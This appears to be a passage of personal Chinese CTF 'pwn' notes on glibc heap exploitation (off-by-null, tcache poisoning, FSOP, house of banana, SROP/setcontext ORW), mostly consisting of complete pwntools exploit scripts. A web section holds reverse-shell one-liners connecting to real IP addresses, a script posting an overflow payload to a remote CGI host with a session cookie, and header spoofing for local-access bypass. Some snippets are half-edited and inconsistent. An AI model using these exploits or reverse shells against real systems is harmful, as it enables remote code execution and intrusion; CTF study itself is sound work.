# mov rax, dword ptr [rdi + 0x20]; mov rbp, rdi;test rax, rax; je 0x34fe3; call rax;跳转至rdi+0x20
gadget = libc_base+0x0000000000034fd5
free_hook_base = (libc_base+libc.sym["__free_hook"]) & 0xfffffffffffff000
pop3_ret = libc_base+0x00000000000e6ce5
leave_ret = libc_base+0x000000000005a9a8
pop_rsp = libc_base+0x000000000002709c
# 劫持free_hook-0xa0,写入
pay  = p64(0)+p64(pop3_ret)+p64(0)*2+p64(leave_ret)#<-开始执行
pay += p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(free_hook_base)
pay += p64(pop_rdx_r12)+p64(0x1000)*2+p64(pop_rax)+p64(0)
pay += p64(syscall)# read
pay += p64(pop_rsp)+p64(free_hook_base)# jmp rsp
pay  = payload.ljust(0xa0,"\x00")
# print len(pay)
pay += p64(gadget)
sla(">>",pay)

pay = p64(pop_rdi)+p64(free_hook_base)+p64(pop_rsi)+p64(0x2000)# mprotect改free_hook段的权限执行shellcode
pay += p64(pop_rdx_r12)+p64(7)+p64(7)+p64(pop_rax)+p64(10)+p64(syscall)+p64(free_hook_base+0x70)
sc  = shellcraft.open("flag");
sc += shellcraft.read(3,free_hook_base+0x300,0x100)
sc += shellcraft.write(1,free_hook_base+0x300,0x100)

sl(pay.ljust(0x70,"\x00")+asm(sc))
#--------------------------------------------------------------
# mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; SROP+setcontext
gadget = libc_base+0x0000000000034fd5
free_hook_base = (libc_base+libc.sym["__free_hook"]) & 0xfffffffffffff000
setcontext = libc_base+libc.sym['setcontext']+61
frame = SigreturnFrame()# 这个框架的地址要赋给rdx
frame.rsp = libc_base + libc.sym['__free_hook']+0x10# 2
frame.rdi = free_hook_base
frame.rsi = 0x1000
frame.rdx = 7
frame.rip = libc_base + libc.sym['mprotect']# 1

# 劫持到free_hook-0x150,写入
frame_addr = libc_base+libc.sym["__free_hook"]-0x150+0x10
pay = p64(0)+p64(frame_addr)+p64(0)*4+p64(setcontext)+str(frame)[0x28:]# 0x28正好补齐即从+0x10开始
pay = payload.ljust(0x150,'\x00')
pay += p64(gadget)
pay += p64(0)+p64(libc_base+libc.sym["__free_hook"]+0x18)#2
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (free_hook_base))
sla(">>",pay)

dele(free_hook-0x150)# *
# orw
sc = asm(shellcraft.cat('flag'))
sc += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (free_hook_base+0x100))
s(sc)
ia()
```



## Pwn with Web 💻

```python
# 创建反向 shell ，并将其输入和输出都重定向到一个远程服务器
cmd = 'bash -c "bash -i >& /dev/tcp/39.102.55.191/9999 0>&1"\x00'
sh -c "sh -i >& /dev/tcp/150.158.144.112/1234 0>&1"\x00
# nc -lvvp 1234
```

发包

```python
from pwn import *
import requests

cookies = {
    'session': 'eyJ1c2VybmFtZSI6Ims0bjk2NiJ9.ZI_LbQ.56KQg3j3spZksRCrTnhkoOu3238',
}

headers = {
    'Accept': '*/*',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Cache-Control': 'max-age=0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://94.74.101.210:50644',
    'Proxy-Connection': 'keep-alive',
    'Referer': 'http://94.74.101.210:50644/',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
}


vip = 0x401129
main = 0x400FF9
payload = b'a'.ljust(0xe8,b'a') + p64(vip) + p64(main)

response = requests.post('http://94.74.101.210:50644/vip.cgi', headers=headers, cookies=cookies, data=payload, verify=False)


print(response.text)
```

增加本地访问

```http
Client-Ip: 127.0.0.1
X-Forwarded-For: 127.0.0.1
```











## Pwn witch 协议🤝
### Protobuf


```
//ctf.proto


syntax = "proto2";

package ctf;

message pwn {
    optional bytes username = 1;
    optional bytes password = 2;
}
```





```shell
// protoc --python_out=./ ./ctf.proto
// ctf.proto        to      ctf_pb2.py

# -*- coding: utf-8 -*-
# Generated by the protocol buffer compiler.  DO NOT EDIT!
# source: ctf.proto
"""Generated protocol buffer code."""
from google.protobuf import descriptor as _descriptor
from google.protobuf import descriptor_pool as _descriptor_pool
from google.protobuf import symbol_database as _symbol_database
from google.protobuf.internal import builder as _builder
# @@protoc_insertion_point(imports)

_sym_db = _symbol_database.Default()




DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\tctf.proto\x12\x03\x63tf\")\n\x03pwn\x12\x10\n\x08username\x18\x01 \x01(\x0c\x12\x10\n\x08password\x18\x02 \x01(\x0c')

_globals = globals()
_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, _globals)
_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, 'ctf_pb2', _globals)
if _descriptor._USE_C_DESCRIPTORS == False:

  DESCRIPTOR._options = None
  _globals['_PWN']._serialized_start=18
  _globals['_PWN']._serialized_end=59
# @@protoc_insertion_point(module_scope)




```





## 堆风水艺术🎨

### 链式堆块

这里主要指的是以链表形式管理的堆块结构
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231127155812.png)
但实际情况会更复杂，因为会有的申请多个附属堆块，一般来说都是可以show附属堆块的内容，所以核心技巧就是劫持0x50堆块




### stdout劫持泄露

```python
flat([0x00000000fbad3887,0,0,0,environ_libc,environ_libc+8,environ_libc+8,environ_libc+8])
```



### offbynull

**高版本要堆地址的，有就简单，没有就需要能申请小size的堆块做堆叠**

**没有edit的情况，参考下边的记录**

利用堆的合并机制，当检测到存在prevsize位，当前堆块prechunk_size_inuse位为0（这里注意size的处理，0xf8（0x100）的堆块，会被标记为0x101，而offbynul会使其为0x100，这样是不改变size大小的，不然会导致size大小的改变），且prevsize位\==上个堆块的size位，free的时候就顺便合并上一个堆块。高版本，多一个check

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/26177342-3385e98bb1814af0.png)

可以直接设置上一个堆块的fd和bk都为它自己(head)来绕过

可以用来构造堆叠

```
a  
	设置prevsize，顺便offbynull
b	free这个堆块

c
```

再申请出来就有libc了(mainarena+96，这个地址通常低位为\0)

后续反复申请回来利用这个堆叠结构劫持tcache实现任意地址申请



如果没有地址需要依靠offbynull泄露地址，就稍微麻烦一点

需要几个条件：

* 能申请0x20，最后堆叠切割需要一个最小size的堆

```python
from pwn import *
context.log_level = 'debug'

s       = lambda data               :p.send(data)
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(data)
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)

p = process("bornote")
elf = ELF('bornote')
libc = elf.libc

def cmd(choice):
	sla("aaa's cmd: ",choice)

def add(size):
	cmd(1)
	sla('Size: ',size)

def edit(idx,content):
	cmd(3)
	sla('Index: ',idx)
	p.sendlineafter('Note: ',content)

def show(idx):
	cmd(4)
	sla('Index: ',idx)

def delete(idx):
	cmd(2)
	sla('Index: ',idx)

def dbg():
	gdb.attach(p)
	pause()
fakechunk = 0x00005561306c6f00
sla('username: ','aaa')


# 这里size最大最好别超过0x440，不然放进largebin时/不在同一个区间上
add(0x418) # 0 
add(0x128) # 1 # 最后绕过tcache个数检测，和最后利用堆复用的chunk一样大
add(0x418) # 2
add(0x438) # 3 
add(0x148) # 4
add(0x428) # 5 
add(0x138) # 6

# fakechunk 粘fd和bk
delete(0)
delete(3)
delete(5)

#设置fakechunk size位
delete(2) 
add(0x438)  # 0 
edit(0,'a' * 0x418 + p64(0xb01)[:7])
add(0x418)  # 2 
add(0x428)  # 3 
add(0x418)  # 5 

# 设置bk
delete(5)
delete(2)
add(0x418)  # 2 
edit(2,p64(0))
add(0x418)  # 5 

# 设置fd
delete(5)
delete(3)
add(0x5f8)# 3 # 置入largebin
add(0x428)# 5
edit(5,'')
add(0x418)# 7
add(0xf8)# 8

# 设置prevsize
edit(6,'a'*0x130+p64(0xb00))
delete(3)

add(0x10)# 3
show(7)
p.recvuntil("Note: ")
libc_base = u64(p.recv(6).ljust(8,'\x00'))- 0x1EBBE0
lg('libc_base',libc_base)
sys = libc_base + libc.sym["system"]
free_hook = libc_base + libc.sym["__free_hook"]
add(0x128)#9
delete(1)
delete(9)
edit(7,p64(free_hook))
add(0x128)# 1
add(0x128)# 9
edit(1,"/bin/sh\x00")
edit(9,p64(sys))
delete(1)

p.interactive()

# 无edit

read_channel(0x138,'1')# 9
dele(9)
dele(6)
read_channel(0x8f0,'1'*(0x860*8)+bin(free_hook)[2:][::-1])#6
read_channel(0x138,bin(0x68732f6e69622f)[2:][::-1])#9
read_channel(0x138,bin(system)[2:][::-1])#10
dele(9)

```



















如果edit和show的是同一个堆块->可被用来伪造的位置 ？

show能输出堆块内容->输出unsortbin尚存的libc地址 **常规**

malloc_size无限制->能申请到一个libc地址

free未置空(UAF)

溢出编辑(UAF)

任意libc地址写值(无要求)->IO_list_all/global_max_fast

下标越界->数组下标不能为int和char类型！

​             ->正向越界，edit越界导致可以修改下一个size(输入后缺少边界校验)

嵌套结构->show外层“姓名”，“姓名”连接到堆块地址

​             ->直接执行地址->调用printf_got表覆写

在调用 pool_alloc 函数时使用 32 位数值 + 1 拓展成 64 位的方法，这里存在整数溢出

将堆溢出转换成 ROP，控制寄存器栈迁移



首先要对功能足够**熟悉**，需要时间，**触发漏洞点**，泄露地址

怎么熟悉，改变量名，边熟边找，触发漏洞点是关键中的关键

往往就能实现泄露，**结合结果和漏洞点**



泄露libc以后一道题就完成了百分之60

剩下部分往往就是重复一遍泄露的打法，比如tcacha poison





要对glibc的**堆管理机制**的漏洞点足够熟悉

double free 的不同版本

malloc_consolidate

offbyone and offfbynull   其中伪造的布局，**不同版本又是如何check**

house of botake

**常见的check**



触发漏洞点后要延展，漏洞延展，达到目的



切割unsortbin，UAF，要去想，怎么才能实现我们的目的，目的导向



常见的目的



构造一个unsortbin和tcachebin或者fastbin的同指针，修改一个完成对另一个的操作



放置进unsortbin，操作的空间就变多了，house of botake



tcache比fastbin好申请，tcache只有7个，unsortBin有很多个



堆叠的概念，上下合并本质上是大包小的问题，也存在小表大的情况，2个一样的指针指向2个堆这叫堆叠



一个完整的exp是水到渠成的



关于堆分水，很多人说的double free UAF unlink tcacha poison



不同size的堆块，想到切割，想到堆叠





常规的doublefree

tcache的doublefree主要由bk控制

fastbin主要通过相应sizebin的头节点堆块来检验







00的形式，fastbin不支持，tcache

010的形式，fastbin是支持的，tcache一直都不支持









 

打断点的意义

1.看寄存器的取值变化

2.看函数的实际传参

### realloc_hook 调整栈帧

劫持malloc为

```python
malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc = libc_base + libc.sym['realloc']
realloc_hook = libc_base + libc.sym['__realloc_hook']
one = libc_base + 0x4527a


edit(1,0x10,p64(malloc_hook-0x23))
add(0x68,'a')# 3
add(0x68,'a'*0xb+p64(one)+p64(realloc+xxx))# 手动调整
```



### 0xff内size UAF

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
# p = process('./ld-2.33.so ./TinyNote'.split(),env={'LD_PRELOAD':'./libc-2.33.so'})
p = process("./vuln")
elf = ELF("./vuln")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(idx,size):
    sla(">",1)
    sla("Index: ",idx)
    sla("Size: ",size)

def edit(idx,con):
    sla(">",3)
    sla("Index: ",idx)
    p.sendafter("Content: ",con)

def show(idx):
    sla(">",4)
    sla("Index: ",idx)

def dele(idx):
    sla(">",2)
    sla("Index: ",idx)

for i in range(8):
    add(i, 0x90)# 0-7

add(8, 0x20)

for i in range(8):
    dele(i)

show(0)
key = u64(p.recv(5).ljust(8,'\x00'))
lg('key')
heap_base = key<<12
lg('heap_base')

edit(7, 'a')# main_arena低地址为\x00
show(7)
libc_base = l64() - 0x1e3c61
lg('libc_base')
free_hook = libc_base + libc.sym["__free_hook"]
system_addr = libc_base + libc.sym["system"]
edit(7, '\x00')

#--------------------改fd----------------------
add(9, 0x20)
add(10, 0x20)# 放binsh
edit(10, "/bin/sh\x00")

dele(8)
dele(9)

edit(9, p64(free_hook ^ key))
add(11, 0x20)
add(12, 0x20)
edit(12, p64(system_addr))

dele(10)
ia()
```



### 输出点

**%s     指针或者数组(能去引索)**

%d     不够地址长度的数(不能引索)

### 输入点/修改点

布局的关键

修改本质就是一种链式引索

```c
buf[read(0, buf, 0x100uLL)] = 0; //offbynull
```



```c
__int64 __fastcall sub_9F5(_BYTE *a1, int a2)
{
  int i; // [rsp+14h] [rbp-Ch]

  if ( a2 <= 0 )
    return 0LL;
  for ( i = 0; ; ++i )
  {
    if ( read(0, a1, 1uLL) != 1 )
      return 1LL;
    if ( *a1 == '\n' )
      break;
    ++a1;
    if ( i == a2 )
      break;
  }
  *a1 = 0;                                      // offbynull
  return 0LL;
}
```





## IO利用

### Linkmap程序基地址

劫持Linkmap链表中存放的程序基地址为one_gadget地址-0x3d70(fini_array_addr)，导致触发fini_array时触发one_gadget

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
# p = process('./ld-2.33.so ./TinyNote'.split(),env={'LD_PRELOAD':'./libc-2.33.so'})
p = process("./manageheap")
elf = ELF("./manageheap")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
# context.terminal = ['cmd.exe', '/c', 'wt.exe', '-w', '0','--title', 'gdb', 'bash', '-c']
context.terminal = ['tmux', 'splitw', '-hp','60']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(size,name,id_con='a'):
    sla("Your Choice:",1)
    sla("please input your major's number:",size)
    p.sendafter("please input your name:",name)
    sa("> \n",id_con)

def show(idx):
    sla("Your Choice:",3)
    sla("input your idx:",idx)

def edit(idx,id_con,new_con):
    sla("Your Choice:",4)
    sla("input your idx:",idx)
    sa("please input your id:",id_con)
    s(new_con)

def dele(idx):
    sla("Your Choice:",2)
    sla("input your idx:",idx)

# 拿地址
heap_base = uu64()-0x2d0
lg('heap_base')
key = heap_base>>12
lg('key')
libc_base = l64()-0x219c61-0x500
lg('libc_base')
link_map = libc_base + 0x2652e0 # search -p "0x5588228e5000" ，然后去看

pwndbg> tel 0x7f651f76f2c0
00:0000│  0x7f651f76f2c0 —▸ 0x5588228e5000 ◂— 0x10102464c457f   0x7f651f76f2c0这个就是
01:0008│  0x7f651f76f2c8 —▸ 0x7f651f76f880 ◂— 0x0    这个位置是名字，程序本身就是空
02:0010│  0x7f651f76f2d0 —▸ 0x5588228ec000 ◂— 0x1d   这里都是1d
03:0018│  0x7f651f76f2d8 —▸ 0x7f651f76f890(这个地址就是next_loadbanana的) —▸ 0x7ffd2b13a000 ◂— jg 0x7ffd2b13a047
04:0020│  0x7f651f76f2e0 ◂— 0x0
05:0028│  0x7f651f76f2e8 —▸ 0x7f651f76f2c0 —▸ 0x5588228e5000 ◂— 0x10102464c457f
06:0030│  0x7f651f76f2f0 ◂— 0x0
07:0038│  0x7f651f76f2f8 —▸ 0x7f651f76f868 —▸ 0x7f651f76f880 ◂— 0x0


lg("link_map")
one = libc_base + 0xebcf1

edit(1,p64((heap_base+0xc20)^key),p64(link_map^key))
add(0x49,'a'*0x10)# 5
add(0x49,p64(one)'放one',p64(heap_base+0x740-0x3D70))# 6

# exit

ia()
```

### mp_.tcache_bins

漏洞点：mp_.tcache_bins可被写为一个大值

```python
add(size)# 这里size要>0x430
# 布置位：heap_base + (size>>4 *8)+0x88

add(0, 0x528)
add(1, 0x600)
add(2, 0x518)

dele(0)
add(3,0x900)
show(0)
libc_base = l64()-0x1e4030
main_arena = libc_base+0x1e4030
lg('libc_base')
mp_ = libc_base + 0x1e3280 # p &mp_
free_hook = libc_base + libc.sym["__free_hook"]
system_addr = libc_base + libc.sym["system"]
lg('mp_')

edit(0,'a'*0x10)
show(0)
ru("a"*0x10)
heap_base = uu64()-0x290
lg('heap_base')
key = heap_base>>12
lg('key')

edit(0,p64(main_arena)*2)
dele(2)
pay = p64(main_arena)*2 + p64(0) + p64(mp_+0x50-0x20)
edit(0,pay)
add(3,0x900)
# -------------------------------------------------------------------
# ---Largebinattack后

dele(1)# 0x600
edit(0,"a"*0xe8 + p64(free_hook))

add(1,0x600)
edit(1, p64(system_addr))
edit(0, "/bin/sh\x00")
dele(0)
ia()
```



![image-20220409223332707](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220409223332707.png)

![image-20220403180012397](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220403180012397.png)

`0x0000564ce2ed6000+0x90`

### global_fast

漏洞点：global_fast可被写为一个大值

在可以申请0xffff类大堆的情况下(**任意地址写任意值**，任意值要求能UAF)

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
p = process("./heap2019")
elf = ELF("./heap2019")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','60']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(size,con='a'):
    sla("4.exit",1)
    sla("Content length:",size)
    p.sendafter("Content:",con)

def edit(con):
    sla("4.exit",2)
    p.sendafter("Comment:",con)

def dele(idx):
    sla("4.exit",3)
    sla("Content id:",idx)

# 漏洞点是任意地址写deadbeef
sla("4.exit",2019)
p.recvuntil("0x")
base = int(p.recv(12),16)-0x202040
lg('base')

add(0x410,'a')# 0
add(0x400,'a')# 1
add(0x420,'a')# 2
add(0x408,'a'*0x400+'/bin/sh\x00')# 3 伪造IO

dele(0)
dele(2)
add(0x2333,'a')# 0
add(0x420,'a')# 2
ru("Data is:\n")
heap_base = uu64()-0x61
lg('heap_base')

add(0x410,'a')# 4
ru("Data is:\n")
libc_base = l64()-0x3c4f00-0x61
lg('libc_base')
system = libc_base + libc.sym['system']
IO_list_all = libc_base + 0x3c5520
lg('IO_list_all')
global_max_fast = libc_base + 0x3c67f8
# ---------------------------------------------
# p &main_arena.fastbinsY
# p &global_max_fast
add(size) 
# delta = IO_list_all/free_hook - main_arena.fastbinsY_addr
# size = (delta * 2) + 0x10
pay = IO_FILE
edit(chunk,pay)
# 一段攻击
dele(chunk) # 写入堆地址
# 二段攻击,利用UAF
# edit(chunk,p64(system))
# add(chunk)//写入system


dele(0)
vtable = heap_base + 0x001150
pay = p64(0)*2
pay += p64(0) + p64(1)
pay = pay.ljust(0xC0,'\x00')
pay += p64(0)+p64(vtable)
# vtable
pay += p64(0)*3
pay += p64(system)
add(0x1400,pay)# 0

edit('a'*0x20+p64(global_max_fast))
dele(0)# IO_list_all写入堆地址

sla("4.exit", '4')
ia()
```



### 2.23 FSOP

```python
system = libc_base + libc.sym['system']

vtable = heap_base + 0x001150
# pay = '/bin/sh\x00'+p64(size)
pay += p64(0)*2 # 可被修改
pay += p64(0) + p64(1)
pay = pay.ljust(0xC0,'\x00')
pay += p64(0)+p64(vtable)
# vtable
pay += p64(0)*3
pay += p64(system)# one_gadget
```

### 2.23 house of orange



![image-20220507104532095](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220507104532095.png)

### 2.27 FSOP

```python
def FILE(binsh,system,IO_str_jumps):
	fake_IO_FILE  = p64(0xfbad1800) + p64(0)*3
	fake_IO_FILE += p64(0) + p64(0xffffffffffffffff) # fp->_IO_write_ptr > fp->_IO_write_base; pos >= (_IO_size_t) (_IO_blen (fp) + flush_only)
	fake_IO_FILE += p64(0)*2 + p64((binsh-100)//2)
	fake_IO_FILE = fake_IO_FILE.ljust(0xC0,'\x00')
	fake_IO_FILE += p64(0) + p64(0)*2	# _mode <= 0
	fake_IO_FILE += p64(IO_str_jumps)
	fake_IO_FILE += p64(system) # 0xe0 
	return fake_IO_FILE

```

### 2.36 FSOP/CAT

只需修改**fake_io_addr**地址，**\_IO_save_end**为想要调用的函数，**\_IO_backup_base**为执行函数时的rdx，以及修改_flags为执行函数时的rdi;

![图片描述](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/959842_JDJKTRK7GJUEUFR.png)

```python
setcontext = libc_base + libc.sym['setcontext'] + 61
IO_wfile_jumps = libc_base + 0x1f30a0
one_gadget = libc_base + 0x105fb7

heap_base = libc_base-0x034000 # heap_base
fake_io_addr = heap_base+0x10 # IO_list_all放的地址

next_chain = 0
fake_IO_FILE  = p64(0xfbad1800) + p64(0) # _flag = '/bin/sh'/rdi
fake_IO_FILE += p64(0)*2
fake_IO_FILE += p64(0)+p64(0xffffffffffffffff)
fake_IO_FILE += p64(0)+p64(0)
fake_IO_FILE += p64(1)+p64(2)
fake_IO_FILE += p64(fake_io_addr+0xb0) # _IO_backup_base = setcontext_rdx/rdx
fake_IO_FILE += p64(one_gadget) # _IO_save_end = call addr(call setcontext)
fake_IO_FILE =  fake_IO_FILE.ljust(0x68, '\x00')
fake_IO_FILE += p64(0) # _chain
fake_IO_FILE =  fake_IO_FILE.ljust(0x88, '\x00')
fake_IO_FILE += p64(heap_base) # _lock = a writable address
fake_IO_FILE =  fake_IO_FILE.ljust(0xa0, '\x00')
fake_IO_FILE += p64(fake_io_addr+0x30) #_wide_data,rax1_addr
fake_IO_FILE =  fake_IO_FILE.ljust(0xc0, '\x00')
fake_IO_FILE += p64(1) 
fake_IO_FILE =  fake_IO_FILE.ljust(0xd8, '\x00')
fake_IO_FILE += p64(IO_wfile_jumps+0x30)  # vtable
fake_IO_FILE += p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr

sl(fake_IO_FILE)
# sl(fake_IO_FILE[0x10:])

```



### house of banana（2.37以上有不同）

__找地址参照<Linkmap程序基地址>__

__这条链还会校验写在rtld_global上堆地址 + 0x3e0的位置，所以要保持大范围的清洁，选择放置IO结构体的位置要谨慎__

__rtld_global上写的堆地址是head头__

__注意，要伪造head头fake_heap_addr + 0x20__
__注意，结构体大小0x334是相对于rtld_global上堆地址+0x10的，注意变换大小__


```c
exit-> __run_exit_handlers->_dl_fini->_dl_fini+520(setcontext)

进  _dl_fini
2.36以上是call rax   可参考 /mnt/hgfs/ctf/hgame/without_hook
2.30是call rdx

```



```python
# UAF
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("week-4.hgame.lwsec.cn","31435")
p = process("./vuln")
elf = ELF("./vuln")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(idx,size):
    sla(">",1)
    sla("Index: ",idx)
    sla("Size: ",size)

def edit(idx,con):
    sla(">",3)
    sla("Index: ",idx)
    p.sendafter("Content: ",con)

def show(idx):
    sla(">",4)
    sla("Index: ",idx)

def dele(idx):
    sla(">",2)
    sla("Index: ",idx)

add(0,0x520)# big
add(1,0x508)
add(2,0x508)# small IO_FILE

dele(0)
add(3,0x900)
show(0)
libc_base = l64()-0x1f70f0
main_arena = libc_base + 0x1f70f0
lg('libc_base')
rtld_global = libc_base+0x23d020
lg('rtld_global')
setcontext = libc_base + libc.sym['setcontext'] + 61
ret = libc_base + libc.sym['setcontext'] + 0x14E
lg('ret')
pop_rdi = libc_base + 0x0000000000023ba5

pop_rsi = libc_base + 0x00000000000251fe
pop_rdx = libc_base + 0x000000000008bbb9 # pop_2
Open=libc_base+libc.sym['open']
Read=libc_base+libc.sym['read']
Write=libc_base+libc.sym['write']
# bin_sh = libc_base + libc.search('/bin/sh\x00').next()
# system =  libc_base + libc.sym['system']
# lg("system")

edit(0,'a'*0x10)
show(0)
ru("a"*0x10)
heap_base = uu64()-0x290
lg('heap_base')
key = heap_base>>12
lg('key')

edit(0,p64(main_arena)*2)
dele(2)
edit(0,p64(main_arena)*2 + p64(0) + p64(rtld_global-0x20))
add(3,0x900)
# -------------------------------------------------------------------

setcontext = libc_base + libc.sym['setcontext'] + 61
ret = libc_base + libc.sym['setcontext'] + 0x14E
pop_rdi = libc_base + 0x0000000000023ba5
bin_sh = libc_base + libc.search('/bin/sh\x00').next()
system =  libc_base + libc.sym['system']
lg('ret')

fake_heap_addr = heap_base+0xcd0 # rtld_global填的堆地址
# flag_addr = fake_heap_addr+0xb8 # 相对偏移
next_load = libc_base + 0x23e8b0 # 第一个load+0x18的值

orw =  p64(pop_rsi)+p64(0)+p64(Open)
